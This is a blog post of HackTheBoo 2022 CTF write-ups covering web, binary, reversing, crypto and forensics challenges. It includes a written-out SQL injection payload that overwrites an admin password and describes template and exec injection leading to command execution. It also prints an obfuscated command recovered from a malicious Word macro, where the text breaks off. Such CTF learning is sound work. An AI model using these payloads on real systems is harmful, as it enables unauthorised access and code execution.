---
title: "HackTheBoo 2022 CTF Write-Ups"
seoDescription: "October is Cybersecurity Awareness Month and form this occasion HackTheBox created a HackTheBook Capture The Flag completion. Forensics, reverse engineering"
datePublished: Thu Oct 27 2022 13:00:42 GMT+0000 (Coordinated Universal Time)
cuid: cl9r2pxof006ap3nvdfiq431s
slug: hacktheboo-2022-htb-ctf-write-ups
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1666856289941/C2LXHVtFS.png
tags: hacking, reverse-engineering, ctf, forensics, write-up

---

%%[support-cta] 

It's been a while since I have participated in [HackTheBox](https://affiliate.hackthebox.com/ifqyv26fgiha) Capture The Flag event. The platform got a really nice, fresh look to it.

![2022-10-22-15-00-32.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666469462336/9VJEqTslX.png align="center")

# Web

## Evaluation Deck

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666469656110/X1HOGLcEe.png align="center")

> A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

**Given**: Docker address + source code  
**Difficulty**: easy

JavaScript game with Python backend - flip the cards to deal damage or heal monster, depending on the dynamic HTML attributes of the card DOM elements. After 8 tries, you can restart the game by refreshing the page.

At first, I thought that to get the flag, I have to intercept the request when card got flipped and change the damage value to kill the ghost with one hit. That was not the case. No additional field in response.

After unziping the source code, in the `challenge/application/blueprints/routes.py` there was a vulnerable code with potential of RCE.

```py
# challenge/application/blueprints/routes.py

code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
```

Basically, the code here executes as it was directly executed in `python` shell. So..

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666470494286/8J3mOvLUm.png align="center")

Python expressions are executed from left to right, can be separated by semicolon. The flag was obtained by sending a modified request (here I'm using Burp, but that doesn't matter). To insert the output of a system command, I've used the `os.popen(..).read()` expression.

![2022-10-22-15-29-53.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666470721257/EkgUC_rkn.png align="center")

**Read more**:

* [py\_compile](https://docs.python.org/3/library/py_compile.html)
    
* [exec](https://docs.python.org/3/library/functions.html#exec)
    
* [popen](https://docs.python.org/3/library/os.html?highlight=popen#os.popen)
    

## Horror Feeds

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666764707020/N1Lj8qva-.png align="left")

> An unknown entity has taken over every screen worldwide and is broadcasting this haunted feed that introduces paranormal activity to random internet-accessible CCTV devices. Could you take down this streaming service?

**Given**: Docker address + source code  
**Difficulty**: easy

Poke the `/api/register` endpoint to see if it is injectable..

![2022-10-25-01-20-58.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666764850585/DAyVr2Mka.png align="left")

..and it is. Because I'm going to insert values directly into database, I'm encoding the `1234` phrase using the code from `challenge/application/utilpy` (`$2b$12$ZcQbtfnbG2x16HZDJyYN.O9lVunjQo4A5wSBtoNIThsaCtBmsS9qy`).

```py
def generate_password_hash(password):
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt).decode()
```

Unfortunately, I can't execute more than one command before committing beforehand.

![2022-10-25-01-26-14.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666824101631/WDyiq9QZO.png align="left")

Because this happens outside my control and I can't do it by myself, I'm stuck with one command. There is however, a way to force change password for admin by using MariaDB/MySQL [extension](https://mariadb.com/kb/en/insert-on-duplicate-key-update/) `INSERT ON DUPLICATE KEY UPDATE`. This way I can update the admin row regardless of its presence in the database.

```json
{"username":"admin\",\"$2b$12$jSXUhVnIZ8eHQbynD1y1TuZL7oMVevF8ORjYwQCFGlN0RbRgnf9Ei\") ON DUPLICATE KEY UPDATE password=\"$2b$12$jSXUhVnIZ8eHQbynD1y1TuZL7oMVevF8ORjYwQCFGlN0RbRgnf9Ei\"#","password":"1234"}
```

After sending the payload, I'm receiving success message on registering account and I can login as admin and read the flag.

![2022-10-25-02-29-24.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666824441562/ZtBkVLMfn.png align="left")

**Read more**:

* https://mariadb.com/kb/en/insert-on-duplicate-key-update/
    

## Spookifier

![2022-10-23-15-03-04.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666824568056/t70ewhSc3.png align="left")

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

**Given**: Docker address + source code  
**Difficulty**: easy

By exploring the attached source files, point of exploitation is established to `spookify(text)` method or more specifically the `Template(result).render()`:

```py
def generate_render(converted_fonts):
    # irrelevant code
	return Template(result).render()
```

Further message proves the Mako templates RCE vulnerability over [context-free payloads](ttps://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/) (running `os.system(..) function`).

> Worth noting that payload creation could be impossible (or significantly harder) if `font4` would not passthrough non-alfanumeric characters. Here are the steps that leads me to reading the flag.

![2022-10-23-15-39-49.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666825102472/qmgsbMqlT.png align="left")

![2022-10-23-15-33-34.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666825129611/-S91HZdPJ.png align="left")

![2022-10-23-15-47-55.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666825150888/qsqQhFLlo.png align="left")

# Pwn

## Pumpkin Stand

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666470958555/SMughS_6I.png align="center")

> This time of the year, we host our big festival and the one who craves the pumpkin faster and make it as scary as possible, gets an amazing prize! Be fast and try to crave this hard pumpkin!

**Given**: Docker address + binary  
**Difficulty**: easy

I have serious lacks in binary exploitation, so for me that was almost pure luck. I have launch Ghidra and opened the binary file.

![2022-10-22-20-44-44.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666471213083/60OpbjcJa.png align="center")

In main, there was a multiple `while(true)` statements and the command reading the flag was past the loops scope. So, the way to get the flag could be to either jump outside the loops by using some overflow mechanics and overwriting the jump pointer on stack or heap.. or by meeting the `break` condition. I'm choosing the second option.

I did notice that almost none of the inputs are validated, only `pumpcoins` value (but also, not so smart). So, I started experimenting by entering different values on the first screen because of the highlighted expression (it takes the number given by the user and multiplies it, before subtracting from the pumpcoins). That way, I was able to determine the correct values for breaking out of the `while` loops.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666471465749/UuytJo9-A.png align="center")

**Read more**:

* [CWE-190: Integer Overflow or Wraparound](https://cwe.mitre.org/data/definitions/190.html)
    

# Reversing

## Cult Meeting

> After months of research, you're ready to attempt to infiltrate the meeting of a shadowy cult. Unfortunately, it looks like they've changed their password!

**Given**: Docker address + binary  
**Difficulty**: easy

I would be surprised if there are quicker way to solve this challenge. Also good reminder to always start with low hanging fruits - like running `strings` over the file.

```sh
$ strings meeting
#among other strings
sup3r_s3cr3t_p455w0rd_f0r_u!
```

Then used that passphrase on the Docker hosted binary to get the shell and `cat` the flag.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666477839272/rpBBXFzyt.png align="center")

## Encoded Payload

> Buried in your basement you've discovered an ancient tome. The pages are full of what look like warnings, but luckily you can't read the language! What will happen if you invoke the ancient spells here?

Well, as always, start with low hanging fruits.

```sh
chmod +x encodedpayload
strace ./encodedpayload
```

![2022-10-23-22-39-50.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666849603647/EIoelsa_O.png align="left")

## Ghost Wrangler

> Who you gonna call?

![2022-10-26-21-16-10.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666849660289/nh9T-xmCV.png align="left")

As you can see, the flag is written to the buffer, and then it is overwritten by the text. So the solution is to [debug the binary](https://github.com/pwndbg/pwndbg#how) and put the breakpoint at main, execute instructions step by step.

```sh
gdb ./ghost
break main
run
nexti
...
# repeat nexti watching the registers
```

![2022-10-26-22-05-43.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666849796747/mrLHj9MEa.png align="left")

## Ouija

> You've made contact with a spirit from beyond the grave! Unfortunately, they speak in an ancient tongue of flags, so you can't understand a word. You've enlisted a medium who can translate it, but they like to take their time...

```plaintext
strings ouija
...
ZLT{Svvafy_kdwwhk_lg_qgmj_ugvw_escwk_al_wskq_lg_ghlaearw_dslwj!}
...
```

Pretty straightforward, but requires some C++ programming knowledge and usage of some disassemble tool like `ghidra`.

Open with `ghidra`, copy disassembled main (only fragment with code). Declare variables, include headers, clear sleeps, replace last print character by character with putting into previously declared array of chars, and after the loop print the flag.

```cpp
#include <stdio.h>
#include <string.h>

void main()
{
    char *flag_txt;
    flag_txt = strdup("ZLT{Svvafy_kdwwhk_lg_qgmj_ugvw_escwk_al_wskq_lg_ghlaearw_dslwj!}");
    int iVar1 = 18;

    char flag[64];
    int iFlag = 0;

    for (; *flag_txt != '\0'; flag_txt = flag_txt + 1)
    {
        if ((*flag_txt < 'a') || ('z' < *flag_txt))
        {
            if ((*flag_txt < 'A') || ('Z' < *flag_txt))
            {
            }
            else
            {
                if (*flag_txt - iVar1 < 0x41)
                {

                    *flag_txt = *flag_txt + '\x1a';
                }
                *flag_txt = *flag_txt - (char)iVar1;
            }
        }
        else
        {
            if (*flag_txt - iVar1 < 0x61)
            {
                *flag_txt = *flag_txt + '\x1a';
            }
            *flag_txt = *flag_txt - (char)iVar1;
        }
        flag[iFlag++] = (unsigned long)(unsigned int)(int)*flag_txt;
    }

    printf(flag);
}
```

![2022-10-26-23-09-00.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666849929037/9TLm29b4H.png align="left")

## Secured Transfer

> Ghosts have been sending messages to each other through the aether, but we can't understand a word of it! Can you understand their riddles?

Given: binary and pcap file

%%[join-cta] 

Me second favourite challenge in this CTF. First we can analyze network traffic, identify 3-way handshake with two data transfers (8 and 32 bytes)

```plaintext
PSH ACK
Data: 8 bytes
2000000000000000 (32,0x20)

FIN PSH ACK
Data: 32 bytes
5f558867993dccc99879f7ca39c5e406972f84a3a9dd5d48972421ff375cb18c
```

Now, by analyzing that binary in `ghidra` and deobfuscating the code a bit (changing variables adding comments). We can make sense of it. After analyzing the binary, I know it can safely be run and monitor the sockets to see on which port the listener starts.

```plaintext
$ ss -t -a

State         Recv-Q     Send-Q              Local Address:Port                   Peer Address:Port     Process     
LISTEN        0          1                         0.0.0.0:1337                        0.0.0.0:*                    
...
```

Then using the Linux manual pages (especially [socket](https://man7.org/linux/man-pages/man2/socket.2.html) communication) and binary data we can recreate the sender flow of data in Python.

```py
#!/usr/bin/python
# Based on: https://realpython.com/python-sockets/#echo-client

import socket

HOST = "0.0.0.0"  # The server's hostname or IP address
PORT = 1337  # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(bytes.fromhex('2000000000000000'))
    s.sendall(bytes.fromhex('5f558867993dccc99879f7ca39c5e406972f84a3a9dd5d48972421ff375cb18c'))
```

Now run the `securetransfer` binary, Python script and flag pops out on the receiver binary.

> If you want to read more detailed writeup, please let me know in the comments

# Crypto

## Gonna-Lift-Em-All

> Quick, there's a new custom Pokemon in the bush called "The Custom Pokemon". Can you find out what its weakness is and capture it?

**Given**: Python script + text file  
**Difficulty**: easy

Oh, this one was something. Guessing by the difficulty set by HTB team mine solution is totally overkill - but hey, as long as it works!

Without giving much thought, I started looking for my previous writeup when I was using the Common Modulus Attack on RSA. I've gone through `RsaCtfTool` and `RSA-Common-Modulus-Attack` tools, but I couldn't make a sense of the data I have.

Then I've started reading the encryptor code and noticed that it is some custom algorithm and flag that can be restored by solving few equations. And just it happens that I started learning [Z3 Theorem Prover](https://github.com/Z3Prover) possibilities.

```py
#!/usr/bin/python
import sys
from z3 import *
from Crypto.Util.number import long_to_bytes

p = 163096280281091423983210248406915712517889481034858950909290409636473708049935881617682030048346215988640991054059665720267702269812372029514413149200077540372286640767440712609200928109053348791072129620291461211782445376287196340880230151621619967077864403170491990385250500736122995129377670743204192511487
g = 90013867415033815546788865683138787340981114779795027049849106735163065530238112558925433950669257882773719245540328122774485318132233380232659378189294454934415433502907419484904868579770055146403383222584313613545633012035801235443658074554570316320175379613006002500159040573384221472749392328180810282909
h = 36126929766421201592898598390796462047092189488294899467611358820068759559145016809953567417997852926385712060056759236355651329519671229503584054092862591820977252929713375230785797177168714290835111838057125364932429350418633983021165325131930984126892231131770259051468531005183584452954169653119524751729
c1 = 159888401067473505158228981260048538206997685715926404215585294103028971525122709370069002987651820789915955483297339998284909198539884370216675928669717336010990834572641551913464452325312178797916891874885912285079465823124506696494765212303264868663818171793272450116611177713890102083844049242593904824396
c2 = 119922107693874734193003422004373653093552019951764644568950336416836757753914623024010126542723403161511430245803749782677240741425557896253881748212849840746908130439957915793292025688133503007044034712413879714604088691748282035315237472061427142978538459398404960344186573668737856258157623070654311038584

y = Int('y')

solver = Solver()

## c1 = g * y % p
solver.add(y < p)
solver.add(y > 2)
solver.add(c1 == g * y %p)
solver.check()
yval = solver.model()[y].as_long()
# y = 151545036818752418931716093171030939827729309717327611184964755063685533596024474465903219353892430936128129116061427826165388249908655823309049171719865481058072839169911183783187254412879190149192386989186799988830028288993778261809217410313001568877314905167838867719115514855795015291428405597461040625720

s = pow(h, yval, p)
# s = 97462626764574972789405707853736776801131892662685049788888445937335307309802916804770978800211152464507610133907443690200443337122554845143013035673411159832257337734583042568923321169807909583339712803034130755892624097871888129173372595909172265258031320357247928751965375753164262717332601963215413213638

## c2 = FLAG * s % p
solver = Solver()

flag = Int('flag')
solver.add(c2 == flag * s % p)
print(solver.check())
flagVal = solver.model()[flag].as_long()

# flag = 1172386289712688621866206342757024282557431573799768202628558217825308016488998421960879829861191968014842977524818155697111668467803322833848788605649390583219898324267188549415037
print(long_to_bytes(flagVal))
#flagVal = b'CTF{******************}'
```

## Fast Carmichael

> You are walking with your friends in search of sweets and discover a mansion in the distance. All your friends are too scared to approach the building, so you go on alone. As you walk down the street, you see expensive cars and math papers all over the yard. Finally, you reach the door. The doorbell says "Michael Fastcar". You recognize the name immediately because it was on the news the day before. Apparently, Fastcar is a famous math professor who wants to get everything done as quickly as possible. He has even developed his own method to quickly check if a number is a prime. The only way to get candy from him is to pass his challenge.

**Given**: Docker + source code **Difficulty**: easy

This time challenge could be solved by not even looking at the source code, only googling the Carmichael numbers and slapping them randomly as inputs to the program. But anyway, reading the code reveals that it expects us to feed it the number that is **simultaneously** prime in definition of custom [Miller-Rabin algorithm](https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test), and not prime in definition of `isPrime` from `Crypto.Util.number` library. By reading a bit about Carmichael numbers, they are specific compound numbers. One of such number, apparently breaking a lot of prime checkers, is [Arnault's 397-digit Carmichael number](https://en.wikipedia.org/wiki/Carmichael_number#Overview). So, I'm calculating it "on side" and feed to online docker.

![2022-10-24-18-48-34.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666825733411/5iEdT5eAT.png align="left")

# Forensics

## Wrong Spooky Season

> "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.

**Given**: pcap file  
**Difficulty**: easy

Well, another example of `strings`Mega Chad.

```sh
strings capture.pcap
```

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666482336889/Jbc4EBY0Z.png align="left")

## Trick or Breach

> Our company has been working on a secret project for almost a year. None knows about the subject, although rumor is that it is about an old Halloween legend where an old witch in the woods invented a potion to bring pumpkins to life, but in a more up-to-date approach. Unfortunately, we learned that malicious actors accessed our network in a massive cyber attack. Our security team found that the hack had occurred when a group of children came into the office's security external room for trick or treat. One of the children was found to be a paid actor and managed to insert a USB into one of the security personnel's computers, which allowed the hackers to gain access to the company's systems. We only have a network capture during the time of the incident. Can you find out if they stole the secret project?

**Given**: pcap file  
**Difficulty**: easy

By analyzing packet file in Wireshark there are a lot of DNS requests. Because we know from the description that some attack could have place, first thing that comes to my minds was [data exfiltration over DNS](https://www.infoblox.com/dns-security-resource-center/dns-security-issues-threats/dns-security-threats-data-exfiltration/).

I'm noticing that running `strings` on given `*.pcap` yields greppable bytes.

```sh
strings capture.pcap | grep "^2" | uniq
```

I'm opening this in text editor, removing `2` prefix and joining all words together. In the [CyberChef](https://gchq.github.io/CyberChef/) I'm using `Magic` recipe. Luckily, the tool is able to recognize it is an Excel file.

![2022-10-23-19-47-39.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666826338521/SBpmmTOqD.png align="left")

Then I'm using the recipe from the left column and search for `HTB` phrase.

![2022-10-23-19-51-29.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666826355031/JtlZvmS8c.png align="left")

## POOF

> In my company, we are developing a new python game for Halloween. I'm the leader of this project; thus, I want it to be unique. So I researched the most cutting-edge python libraries for game development until I stumbled upon a private game-dev discord server. One member suggested I try a new python library that provides enhanced game development capabilities. I was excited about it until I tried it. Quite simply, all my files are encrypted now. Thankfully I manage to capture the memory and the network traffic of my Linux server during the incident. Can you analyze it and help me recover my files? To get the flag, connect to the docker service and answer the questions.

**Given**: archive, encrypted file & pcap file  
**Difficulty**: easy (?)

%%[support-cta] 

Oh boy, that was my favorite challenge from this CTF. At each step, I knew what I have to do, but this was the first time I was using all the tools required and it took me 6

```sh
$ unzip -l forensics_poof.zip | column -t
Archive:    forensics_poof.zip         
Length      Date                Time   Name
---------   ----------          -----  ----
2567089     2022-10-20          11:12  candy_dungeon.pdf.boo
1096901984  2022-10-20          18:11  mem.dmp
7839830     2022-10-20          11:25  poof_capture.pcap
1126698     2022-10-20          12:04  Ubuntu_4.15.0-184-generic_profile.zip
---------   -------                    
1108435601  4                   files
```

* `candy_dungeon.pdf.boo` - encrypted file, the final goal is to decode it
    
* `mem.dmp` - memory dump
    
* `Ubuntu_4.15.0-184-generic_profile.zip` - profile for [volatility](https://github.com/volatilityfoundation/volatility) that is required to analyze memory dump
    
* `poof_capture.pcap` - network traffic capture file
    

When I connect to the given Docker instance I was presented with the question I have to answer to see the next question. This way we were led, step by step, to the solution (and flag).

![2022-10-25-18-40-55.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666847840207/4ssoPmEGg.png align="left")

🔸 **Which is the malicious URL that the ransomware was downloaded from? (for example: http://maliciousdomain/example/file.extension)**

![2022-10-25-20-04-44.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1666847913424/v5HvQAyhG.png align="left")

Answer: `http://files.pypi-install.com/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz`

🔸 **What is the name of the malicious process? (for example: malicious)**

```sh
$ alias volatility='python2 /opt/volatility/vol.py'
$ cp Ubuntu_4.15.0-184-generic_profile.zip /opt/volatility/volatility/plugins/overlays/linux

$ volatility --info | grep -i ubuntu
Volatility Foundation Volatility Framework 2.6.1
LinuxUbuntu_4_15_0-184-generic_profilex64 - A Profile for Linux Ubuntu_4.15.0-184-generic_profile x64

$ volatility -f files/mem.dmp --profile LinuxUbuntu_4_15_0-184-generic_profilex64 linux_psenv > linux_psenv.out
```

Inside the process dump:

```plaintext
configure         1341   SSH_CONNECTION=10.0.2.2 59640 10.0.2.15 22 LESSCLOSE=/usr/bin/lesspipe %s %s LANG=en_US.UTF-8 XDG_SESSION_ID=1 USER=developer PWD=/home/developer/Documents/halloween_python_game/pygaming-dev-13.37 HOME=/home/developer SSH_CLIENT=10.0.2.2 59640 22 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop SSH_TTY=/dev/pts/0 MAIL=/var/mail/developer TERM=tmux-256color SHELL=/bin/bash SHLVL=1 LOGNAME=developer XDG_RUNTIME_DIR=/run/user/1000 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin LESSOPEN=| /usr/bin/lesspipe %s _=./configure OLDPWD=/home/developer/Documents/halloween_python_game _MEIPASS2=/tmp/_MEIiYpNyP _PYI_PROCNAME=configure LD_LIBRARY_PATH=/tmp/_MEIiYpNyP
```

Answer: `configure`

🔸 **Provide the md5sum of the ransomware file.**

The quickest and most reliable way is to [save the file directly](https://www.rubyguides.com/2012/01/four-ways-to-extract-files-from-pcaps/) from the `*.pcap` file using Wireshark.

```sh
$ tar xf pygaming-dev-13.37.tar.gz 
$ cd pygaming-dev-13.37
$ file configure 
configure: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ac40f3d3f795f9ee657f59a09fbedea23c4d7e25, for GNU/Linux 2.6.32, stripped
$ md5sum configure                
7c2ff873ce6b022663a1f133383194cc  configure
```

Answer: `7c2ff873ce6b022663a1f133383194cc`

🔸 **Which programming language was used to develop the ransomware? (for example: nim)**

```plaintext
$ strings configure
...
Py_DontWriteBytecodeFlag
Py_FileSystemDefaultEncoding
Py_FrozenFlag
Py_IgnoreEnvironmentFlag
Py_NoSiteFlag
Py_NoUserSiteDirectory
Py_OptimizeFlag
Py_VerboseFlag
Py_UnbufferedStdioFlag
Py_BuildValue
Py_DecRef
Cannot dlsym for Py_DecRef
...
```

Answer: `python`

🔸 **After decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption)**

```plaintext
python pyinstxtractor.py configure
pycdc configure.pyc > ../source/configure.py
```

Answer: `mv18jiVh6TJI9lzY`

🔸 **Decrypt the given file, and provide its md5sum.**

```py
#!/usr/bin/python
from Crypto.Cipher import AES

data = open('files/candy_dungeon.pdf.boo', 'rb').read()
key = 'vN0nb7ZshjAWiCzv'
iv = b'ffTC776Wt59Qawe1'
cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
pt = cipher.decrypt(data)
open('restored/candy_dungeon.pdf', 'wb').write(pt)
```

Answer: `3bc9f072f5a7ed4620f57e6aa8d7e1a1`

Flag was given after answering last question.

> If you want more detailed writeup, explaining bit more about `volatility`, let me know in the comments

## Halloween Invitation

> An email notification pops up. It's from your theater group. Someone decided to throw a party. The invitation looks awesome, but there is something suspicious about this document. Maybe you should take a look before you rent your banana costume.

**Given**: Word document with macro enabled  
**Difficulty**: easy

I've solved one very similar task during the last year [HTB Business CTF](https://blog.cyberethical.me/htb-business-ctf-2021-badransomware) and you can find the detailed solution there.

First, extract the VBA macro:

```sh
olevba --deobf invitation.docm > olevba.out
```

Then using manual deobfuscation (and [code indenter](https://www.automateexcel.com/vba-code-indenter/)) and VBA documentation I've converted the VBA code to Python script.

```py
#!/usr/bin/python

def decodeAsHex(str):
    return "".join([chr(int(str[i:i+2],16)) for i in range(0, len(str), 2)])

def decodeChar(str):
    return "".join([chr(int(s)) for s in str.split(' ')])
    

def getBase64EncodedPayload():
    command = ""
    command = command + decodeChar(decodeAsHex("3734203635203636203132322036352036382034382036352037342031") + decodeAsHex("31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"))
    command = command + decodeChar(decodeAsHex("363520313230203635203638203130") + decodeAsHex("37203635203739203635203635203131372036352036382038352036352037372031303320363520353420363520363820313033203635203737203635203635203532"))
    command = command + decodeChar(decodeAsHex("3635203638203635203635203734") + decodeAsHex("20313139203635203535203635203637203831203635203937203831203635203537203635203637203939203635203930203635203635203438203635203638203737"))
    command = command + decodeChar(decodeAsHex("3635203839203130332036362031303620363520373120373720363520373820313033203636203130372036352036") + decodeAsHex("37203438203635203737203635203635203438203635203638203737203635203930"))
    command = command + decodeChar(decodeAsHex("313033203635203132312036352036382038312036352037372036352036352035") + decodeAsHex("33203635203637203438203635203738203131392036362031303820363520373120363920363520373720313033203635"))
    command = command + decodeChar(decodeAsHex("313232203635203731203639203635203737203130332036362031303620363520363720393920363520373920313139203635203130372036352037322036352036352038302038312036352031") + decodeAsHex("3130203635"))
    command = command + decodeChar(decodeAsHex("373120313033203635203130302036352036362034382036352037322036352036352037392031303320") + decodeAsHex("36352031313820363520363720353620363520373420313139203635203535203635203637203831"))
    command = command + decodeChar(decodeAsHex("36352031303020313033203635203537203635203639203130372036352039382031303320363620353020363520373120353620363520393720313139203636203130382036352036372034") + decodeAsHex("38203635203835"))
    command = command + decodeChar(decodeAsHex("31303320363620313038203635203732203737203635203130302036352036362037382036352037312038352036352031303020363520363620313131203635203731203536203635203930") + decodeAsHex("203635203635"))
    command = command + decodeChar(decodeAsHex("313033203635203637203438203635203836203831203636203132322036352037312038") + decodeAsHex("35203635203831203130332036362031303420363520373220373720363520393720383120363620313036203635"))
    command = command + decodeChar(decodeAsHex("373020363520363520383920383120363620313231203635203732203737203635203937203831203636") + decodeAsHex("2031313720363520373120393920363520373320363520363520313136203635203730203835203635"))
    command = command + decodeChar(decodeAsHex("3939203130332036362031313220363520363720363520363520373420363520363620313139203635203637203831203635203939203131392036352031313820") + decodeAsHex("3635203731203831203635203738203635"))
    command = command + decodeChar(decodeAsHex("363520313232203635203731203733203635") + decodeAsHex("20383920313139203636203130362036352036382038392036352039302036352036352031303320363520363720343820363520383320363520363620313038"))
    command = command + decodeChar(decodeAsHex("36352037312036392036352039302036352036362031303820363520373220373320363520393920313139203635") + decodeAsHex("20313033203635203639203635203635203130312031313920363520313035203635203639"))
    command = command + decodeChar(decodeAsHex("363920363520313030203831203636203438203635203731203130332036352039") + decodeAsHex("38203131392036362031323120363520373120313037203635203130312031303320363620313034203635203732203831"))
    command = command + decodeChar(decodeAsHex("363520393720383120363620") + decodeAsHex("313138203635203731203532203635203733203130332036352035372036352036372038312036352039372038312036362035372036352036382031313520363520313030"))
    command = command + decodeChar(decodeAsHex("313139203636203131312036352037312031303720363520393820363520363620313038") + decodeAsHex("2036352036372036352036352037352036352036352031303720363520373220383120363520393920313033203636"))
    command = command + decodeChar(decodeAsHex("34392036352037312038352036352037352038312036362035352036352036372038312036352038392031313920363520353720363520363720313033203635203833203831203636203131") + decodeAsHex("37203635203732"))
    command = command + decodeChar(decodeAsHex("38392036352039382031313920363620313134203635203731203835203635203736203831203636203833") + decodeAsHex("20363520373120383520363520393920313139203636203438203635203639203438203635203930"))
    command = command + decodeChar(decodeAsHex("38312036362034382036352037312031303320363520393820313139203636203130372036352036372036352036352037362038312036362038362036352037322037") + decodeAsHex("37203635203930203831203636203637"))
    command = command + decodeChar(decodeAsHex("363520373120363920363520393920313139203636203131322036352037312037372036352038352036352036362031303420363520") + decodeAsHex("37322037332036352039392031313920363620313132203635203731"))
    command = command + decodeChar(decodeAsHex("35322036352039302031313920363520313033203635203637203438203635203836203831203636203132312036352037312031303720363520373320363520363520313037203635203732203635") + decodeAsHex("203635"))
    command = command + decodeChar(decodeAsHex("37342036352036362031323220363520363720") + decodeAsHex("35362036352037372036352036352034382036352036382037372036352039302031303320363520313231203635203638203831203635203737203635203635"))
    command = command + decodeChar(decodeAsHex("353320363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635") + decodeAsHex("2037312038352036352039392031303320363620313232203635203637"))
    command = command + decodeChar(decodeAsHex("36352036352038312036352036362035352036352036372037332036352038") + decodeAsHex("3120383120363620343920363520373220383120363520393720363520363620313138203635203732203733203635203937"))
    command = command + decodeChar(decodeAsHex("383120363620353420363520373120363920363520") + decodeAsHex("313030203635203636203131322036352037312035362036352039382031303320363520313035203635203638203438203635203734203635203636"))
    command = command + decodeChar(decodeAsHex("31313220363520373220343820363520") + decodeAsHex("37352038312036352035352036352037312031303720363520393020313033203635203130332036352036372031303320363520373420363520363620313036203635"))
    command = command + decodeChar(decodeAsHex("3637") + decodeAsHex("20363520363520373620383120363620313137203635203731203835203635203733203635203635203131302036352036392035322036352039382031313920363620313137203635203731203835"))
    command = command + decodeChar(decodeAsHex("363520373420313139203635203131322036352036372036352036352031303120313139203635203130372036352037322037332036352038302038312036362031313220363520") + decodeAsHex("373120383520363520313031"))
    command = command + decodeChar(decodeAsHex("36352036352031303320") + decodeAsHex("363520363720383120363520383920313139203635203130332036352036372034382036352038322038312036362031323120363520373220373320363520393820313139203636"))
    command = command + decodeChar(decodeAsHex("3132312036352036392036392036352038392031313920363620343820363520373120313037203635203938203131392036362031313720363520") + decodeAsHex("363720363520363520383520313139203636203438203635"))
    command = command + decodeChar(decodeAsHex("3731203536203635203939203635203635203130332036352036372034382036352038322038312036362031323120") + decodeAsHex("36352037322037332036352039382031313920363620313231203635203730203839"))
    command = command + decodeChar(decodeAsHex("363520383920383120363620313231203635203731203130372036352038392038") + decodeAsHex("31203636203130352036352037312031313920363520393020383120363520313033203635203731203835203635203739"))
    command = command + decodeChar(decodeAsHex("3131392036352031303720363520373220373320363520383020383120") + decodeAsHex("3636203830203635203732203835203635203130302036352036352031313620363520373020373720363520313030203635203636"))
    command = command + decodeChar(decodeAsHex("3132312036352037") + decodeAsHex("31203130372036352039382031303320363620313130203635203637203635203635203736203831203636203734203635203731203532203635203939203635203636203439203635"))
    command = command + decodeChar(decodeAsHex("37322038312036352038342031313920363620313035203635203731203131312036352039302038312036362031303620363520373220383120363520373320363520363520313037203635203732") + decodeAsHex("203733"))
    command = command + decodeChar(decodeAsHex("3635203739203131392036352031303720363520373220383120363520383020383120363620") + decodeAsHex("373420363520373120353220363520313030203130332036362031313820363520373120313135203635203930"))
    command = command + decodeChar(decodeAsHex("38312036352031313620363520373020373320363520393020383120363620313232203635203732203831203635203834203831203636203130") + decodeAsHex("3820363520373220383120363520393720363520363620313138"))
    command = command + decodeChar(decodeAsHex("3635203731203831203635203733") + decodeAsHex("20363520363520313136203635203730203835203635203939203130332036362031313220363520363720363520363520373420363520363620313139203635203637"))
    command = command + decodeChar(decodeAsHex("3831203635203939203131392036352031313820363520363820393920363520393020383120363620313034203635203638203733203635203737203131392036362031303420363520363820373320") + decodeAsHex("3635"))
